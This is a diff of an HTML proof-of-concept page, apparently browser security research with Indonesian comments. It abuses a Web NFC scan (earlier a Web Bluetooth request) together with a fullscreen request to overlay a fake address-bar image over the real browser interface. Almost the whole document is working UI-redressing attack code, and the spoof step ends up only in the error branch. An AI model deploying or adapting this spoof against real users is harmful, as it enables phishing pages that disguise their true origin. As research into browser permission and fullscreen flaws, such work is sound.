@@ -1,21 +1,54 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-    <title>Security UI Test - Permission Priority</title>
+    <title>Security Research - NFC Fullscreen Spoof</title>
     <meta charset="utf-8">
     <meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no"/>
     <style>
-        body, html { margin: 0; padding: 0; width: 100%; height: 100%; overflow: hidden; }         
-        #spoof { width: 100%; height: 100%; display: none; object-fit: cover; position: fixed; z-index: 9999; }
-        #content { display: flex; align-items: center; justify-content: center; height: 100vh; }
+        body, html {
+            margin: 0;
+            padding: 0;
+            width: 100%;
+            height: 100%;
+            overflow: hidden;
+            background-color: white;
+            font-family: sans-serif;
+        }         
+        #spoof {
+            width: 100%;
+            height: 100%;
+            display: none;
+            object-fit: cover;
+            position: fixed;
+            top: 0;
+            left: 0;
+            z-index: 9999;
+        }
+        #content {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            height: 100vh;
+            text-align: center;
+        }
+        .trigger-box {
+            padding: 40px;
+            border: 3px dashed #333;
+            border-radius: 15px;
+            background: #f0f0f0;
+            cursor: pointer;
+        }
     </style>
 </head>  
 <body>
+    <!-- Gambar UI Spoof (Omnibox Palsu) -->
     <img id="spoof" src="spoof.png.jpeg">
+
     <div id="content">
-        <div style="padding: 40px; border: 3px solid red; cursor: pointer;">
-            <h1>KLIK UNTUK TEST</h1>
-            <p>Memprioritaskan Dialog Izin</p>
+        <div class="trigger-box">
+            <h1>NFC Security Test</h1>
+            <p>Klik di sini untuk menguji UI Redressing via Web NFC</p>
         </div>
     </div>
 
@@ -23,35 +56,38 @@
         window.onclick = async () => {
             const spoofImg = document.getElementById("spoof");
             const mainContent = document.getElementById("content");
+            const elem = document.documentElement;
 
-            // STRATEGI: Panggil dialog izin TERLEBIH DAHULU sebelum fullscreen
-            // Ini menggunakan "User Gesture" yang sama
             try {
-                // Gunakan Bluetooth atau NFC sebagai pemicu dialog
-                const p1 = navigator.bluetooth.requestDevice({ acceptAllDevices: true });
-                
-                // Segera eksekusi fullscreen saat dialog sedang diproses oleh sistem
-                if (document.documentElement.requestFullscreen) {
-                    document.documentElement.requestFullscreen();
-                }
+                // 1. Cek apakah Web NFC didukung
+                if ('NDEFReader' in window) {
+                    const ndef = new NDEFReader();
+                    
+                    // 2. Mulai pemindaian NFC (Memicu Dialog Sistem/Indikator)
+                    // Kita panggil tepat sebelum atau bersamaan dengan Fullscreen
+                    const nfcPromise = ndef.scan();
 
-                // Ganti UI ke spoof
+                    // 3. Masuk Fullscreen
+                    if (elem.requestFullscreen) {
+                        await elem.requestFullscreen();
+                    }
+
+                    // 4. Ganti tampilan ke Spoof
+                   
+
+                    await nfcPromise;
+                } else {
+                    alert("Web NFC tidak didukung di browser/perangkat ini.");
+                }
+            } catch (e) {
+                console.log("NFC Error atau Izin Ditolak: " + e.name);
+                
+                // Fallback: Tetap masuk fullscreen jika NFC gagal
+                if (elem.requestFullscreen) {
+                    elem.requestFullscreen();
+                }
                 spoofImg.style.display = "block";
                 mainContent.style.display = "none";
-
-                await p1; // Tunggu hasil dialog (jika diperlukan)
-            } catch (e) {
-                console.log("Dialog muncul atau diblokir: " + e.name);
-                
-                // Fallback: Jika Bluetooth gagal, langsung coba NFC
-                try {
-                    if ('NDEFReader' in window) {
-                        const ndef = new NDEFReader();
-                        await ndef.scan();
-                    }
-                } catch (err) {
-                    console.log("NFC juga gagal.");
-                }
             }
         };
     </script>
